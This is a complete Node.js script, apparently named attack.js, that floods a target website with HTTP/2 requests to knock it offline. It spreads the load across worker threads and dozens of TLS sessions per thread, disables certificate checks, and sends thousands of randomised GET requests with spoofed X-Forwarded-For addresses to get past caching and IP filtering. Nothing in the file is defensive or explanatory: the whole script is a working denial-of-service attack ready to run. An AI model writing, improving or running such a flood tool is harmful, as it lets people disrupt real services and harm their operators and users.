const http2 = require('http2');
const tls = require('tls');
const { Worker, isMainThread, workerData } = require('worker_threads');
const { cpus } = require('os');

const THREADS = Math.min(14, cpus().length);

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);

    console.log(`Launching attack on ${target} for ${duration}s with ${THREADS} threads...`);

    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, { workerData: { target, duration } });
    }
} else {
    const { target, duration } = workerData;
    const end = Date.now() + duration * 1000;
    const url = new URL(target);

    function createRawSession() {
        const socket = tls.connect({
            host: url.hostname,
            port: 443,
            servername: url.hostname,
            ALPNProtocols: ['h2'],
            rejectUnauthorized: false,
            ciphers: 'GREASE:AES128-GCM-SHA256:AES256-GCM-SHA384',
            sigalgs: 'rsa_pss_rsae_sha256:ECDSA+SHA256',
            honorCipherOrder: true,
        }, () => {
            const client = http2.connect(target, {
                createConnection: () => socket
            });

            client.on('error', () => {});
            client.on('close', () => {});
            flood(client);
        });

        socket.on('error', () => {});
    }

    function flood(client) {
        (async () => {
            while (Date.now() < end) {
                for (let i = 0; i < 1000; i++) {
                    try {
                        const req = client.request({
                            ':method': 'GET',
                            ':path': `/${Math.random().toString(36).slice(2)}?v=${Date.now()}`,
                            'user-agent': 'Mozilla/5.0',
                            'x-forwarded-for': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
                        });
                        req.on('error', () => {});
                        req.end();
                    } catch (err) {}
                }
                await new Promise(r => setTimeout(r, 5));
            }
            client.close();
        })();
    }

    for (let i = 0; i < 60; i++) createRawSession();
}
